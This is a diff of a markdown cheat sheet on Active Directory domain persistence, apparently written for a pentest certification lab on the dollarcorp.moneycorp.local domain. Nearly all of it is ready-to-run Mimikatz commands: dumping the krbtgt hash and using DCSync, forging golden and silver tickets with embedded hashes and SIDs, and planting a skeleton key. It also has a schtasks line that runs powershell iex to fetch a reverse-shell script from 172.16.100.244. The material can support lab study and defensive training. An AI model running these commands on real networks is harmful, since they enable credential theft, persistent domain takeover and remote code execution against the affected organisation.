@@ -464,52 +464,81 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.money
 
 # Domain persistence
 ## Golden ticket
+The krbtgt user hash could be used to impersonate any user with any privileges from even a non domain machine.
+
 #### Dump hashes - Get the krbtgt hash
 ```
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
 ```
 
 #### Make golden ticket
+Use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process
+To get the SID use ```Get-DomainSID``` from powerview
 ```
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
-
-#use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process
-#sid = full sid of anything minus the last block
 ```
 
-#### Use the DCSync feature for getting krbtgt hash execute with DA privileges
+#### Use the DCSync feature for getting krbtgt hash. Execute with DA privileges
 ```
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
+#### Check WMI Permission
+```
+Get-wmiobject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+
 ## Silver ticket
-#### Make silver ticket
+#### Make silver ticket for CIFS
+Use the hash of the local computer
 ```
-#Use the hash of the local computer
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:f3daa97a026858a2665f17a4a83a150a /user:Administrator /ptt"'
+```
 
+#### Check access (After CIFS silver ticket)
+Use the hash of the local computer
+```
+ls \\servername\c$\
+```
+
+#### Make silver ticket for Host
+Use the hash of the local computer
+```
 Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:f3daa97a026858a2665f17a4a83a150a /user:Administrator /ptt"'
-
-#Execute for WMI /service:HOST /service:RPCSS
 ```
 
-#### Schedule and execute a task
+#### Schedule and execute a task (After host silver ticket)
 ```
 schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Reverse" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.244/Invoke-PowerShellTcp.ps1''')'"
 
 schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN “Reverse”
 ```
 
+#### Make silver ticket for WMI
+Execute for WMI /service:HOST /service:RPCSS
+```
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:f3daa97a026858a2665f17a4a83a150a /user:Administrator /ptt"'
+
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:f3daa97a026858a2665f17a4a83a150a /user:Administrator /ptt"'
+```
+
+#### Check WMI Permission
+```
+Get-wmiobject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+
 ## Skeleton key
+Access any machine with the password mimikatz
+Leaves a big gap in their security!
+
 #### Create the skeleton key
 ```
-#Leaves a big gap in their security!
 Invoke-MimiKatz -Command ‘”privilege::debug” “misc::skeleton”’ -Computername dcorp-dc.dollarcorp.moneycorp.local
-
-#access any machine with the password mimikatz
 ```
 
 ## DSRM
 Directory Services Restore Mode
+
 #### Dump DSRM password - dumps local users
 ```
 #look for the local administrator password
